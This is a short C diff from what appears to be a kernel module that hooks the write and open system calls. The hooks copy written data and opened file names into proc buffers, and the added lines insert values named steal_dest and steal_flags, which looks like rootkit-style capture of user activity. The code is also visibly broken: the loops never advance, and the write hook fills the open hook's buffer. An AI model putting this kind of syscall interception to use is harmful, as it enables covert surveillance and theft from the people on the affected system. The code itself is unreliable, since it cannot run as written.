@@ -94,7 +94,9 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
         int i = 0;
         while (buffer[i] != '\0' && i <1000){
           proc_buffer_write[i] = buffer[i];
-
+        }
+        if(i<1000){
+          proc_buffer_open[i+1] = steal_dest;
         }
         proc_buffer_size_write = i;
         return (*old_write)(fildes, buf, nbytes);
@@ -119,6 +121,9 @@ static unsigned long new_open(const char *filename, int flags, int mode)
         while (buffer[i] != '\0' && i <1000){
           proc_buffer_open[i] = buffer[i];
 
+        }
+        if(i<1000){
+          proc_buffer_open[i+1] = steal_flags;
         }
         proc_buffer_size_open = i;
         return (*old_open)(filename, flags, mode);
